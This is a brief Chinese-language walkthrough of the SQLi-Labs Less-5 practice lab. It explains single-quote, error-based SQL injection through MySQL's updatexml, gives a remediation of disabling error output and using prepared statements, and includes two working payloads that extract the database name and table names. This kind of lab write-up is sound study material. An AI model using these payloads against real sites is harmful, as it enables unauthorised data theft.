# SQLi-Labs | Less-5 GET 单引号 报错注入（无直接回显）
## 一、漏洞简介
单引号字符型，页面不会输出查询结果，但是会打印mysql错误信息，适合updatexml报错注入。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-5/?id=1
## 三、复现步骤
1. ?id=1' 报错，单引号闭合
2. 直接使用updatexml报错注入，页面爆出数据
## 四、Payload
?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+
## 五、漏洞原理
SQL语句直接拼接，开启了mysql错误输出，利用updatexml函数报错带出数据。
## 六、修复方案
关闭详细错误回显，使用预编译。
## 七、总结
没有查询回显，但有报错，优先报错注入。